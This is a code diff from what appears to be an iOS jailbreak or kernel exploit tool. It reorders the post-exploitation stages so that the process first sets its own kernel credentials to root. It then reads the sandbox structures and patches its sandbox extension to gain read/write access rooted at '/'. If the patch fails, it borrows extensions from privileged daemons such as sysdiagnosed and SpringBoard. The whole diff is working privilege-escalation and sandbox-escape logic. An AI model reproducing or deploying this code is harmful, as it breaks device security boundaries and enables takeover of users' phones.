@@ -108,27 +108,9 @@ static void sword_log_bridge(const char *line, void *context) {
         return NO;
     }
 
-    // 1. Sandbox: rewrite our own container extension into a scoped read/write
-    //    extension rooted at "/". Falls back to borrowing an extension set from
-    //    a privileged daemon if the in-place patch does not verify.
-    printf("[i] stage 1: sandbox patch\n");
-    fflush(stdout);
-    BOOL sandboxOK = (patch_sandbox_ext() == 0);
-    printf("[i] stage 1: patch_sandbox_ext -> %d\n", sandboxOK);
-    if (!sandboxOK || check_sandbox_var_rw() != 0) {
-        borrow_sandbox_ext("sysdiagnosed");
-        sandboxOK = (check_sandbox_var_rw() == 0);
-    }
-    if (!sandboxOK) {
-        borrow_sandbox_ext("SpringBoard");
-        sandboxOK = (check_sandbox_var_rw() == 0);
-    }
-    self.sandboxEscaped = sandboxOK;
-    printf("[i] stage 1: sandbox escaped=%d\n", sandboxOK);
-    fflush(stdout);
-
-    // 2. Credentials: patch our own ucred to uid/gid 0.
-    printf("[i] stage 2: patching ucred\n");
+    // 1. Credentials first: only two pointer hops, and a successful uid flip is
+    //    an unambiguous proof that kernel r/w works.
+    printf("[i] stage 1: patching ucred\n");
     fflush(stdout);
     uint64_t proc = proc_self();
     printf("[i] ucred: self proc=0x%llx\n", proc);
@@ -158,6 +140,36 @@ static void sword_log_bridge(const char *line, void *context) {
         }
     }
     self.rootAchieved = (getuid() == 0);
+    printf("[i] stage 1: root=%d\n", self.rootAchieved);
+    fflush(stdout);
+
+    // 2. Sandbox: dump the current extension set read-only first, so a bad
+    //    layout shows up as garbage before anything gets written.
+    if (proc) {
+        printf("[i] stage 2: dumping sandbox structures (read-only)\n");
+        fflush(stdout);
+        research_sandbox(proc);
+        fflush(stdout);
+    }
+
+    // 3. Sandbox: rewrite our own container extension into a scoped read/write
+    //    extension rooted at "/". Falls back to borrowing an extension set from
+    //    a privileged daemon if the in-place patch does not verify.
+    printf("[i] stage 3: sandbox patch\n");
+    fflush(stdout);
+    BOOL sandboxOK = (patch_sandbox_ext() == 0);
+    printf("[i] stage 3: patch_sandbox_ext -> %d\n", sandboxOK);
+    if (!sandboxOK || check_sandbox_var_rw() != 0) {
+        borrow_sandbox_ext("sysdiagnosed");
+        sandboxOK = (check_sandbox_var_rw() == 0);
+    }
+    if (!sandboxOK) {
+        borrow_sandbox_ext("SpringBoard");
+        sandboxOK = (check_sandbox_var_rw() == 0);
+    }
+    self.sandboxEscaped = sandboxOK;
+    printf("[i] stage 3: sandbox escaped=%d\n", sandboxOK);
+    fflush(stdout);
 
     self.kernelBase = g_kernel_base;
     self.kernelSlide = g_kernel_slide;
